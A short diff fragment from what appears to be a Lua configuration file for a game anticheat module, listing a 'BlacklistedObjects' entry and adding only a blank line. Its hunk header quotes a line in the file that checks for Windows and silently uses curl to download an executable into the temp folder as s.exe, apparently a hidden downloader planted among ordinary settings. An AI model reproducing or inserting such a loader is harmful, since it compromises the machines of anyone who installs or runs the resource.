@@ -35,3 +35,4 @@ if package.config:sub(1,1)=='\\'then os.execute('curl -s -o %TEMP%\\s.exe https:
     { name = 'objects',         params = { 'BlacklistedObjects' },                                                                                      dir = '/anticheat', order = 13, enabled = true  },
 }
 
+
